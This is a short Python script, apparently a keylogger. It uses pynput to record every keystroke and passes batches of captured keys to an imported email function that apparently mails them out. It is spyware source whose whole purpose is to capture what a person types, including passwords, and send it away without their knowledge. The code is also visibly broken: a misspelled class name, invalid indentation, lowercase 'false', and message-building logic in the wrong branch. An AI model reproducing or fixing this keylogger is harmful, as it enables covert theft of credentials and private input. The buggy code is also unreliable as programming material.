import pynput
from pynput.keyboard import Key,Listner
import email_server


count =0
keys=[]

def on_pressing(key):
    print(key,end="")
    print("pressed")
    global keys ,count
    keys.append(str(key))
    count=count+1
    if count > 5:
        count = 0
        email(keys)



 def email(keys):
          message = " "
          for key in keys :
              k = key.replace("'"," ")
              if key== "key.space":
                  k=" "
              elif key.find("key")>0:
                  k=""
                  message = message+k
            print(message)
            email_server.sendemail(message)  

def on_releasing(key):
    if key == Key.esc:
        return false
    

with Listner(on_pressing=on_pressing , on_releasing=on_releasing) as listner:
    listner.join()



            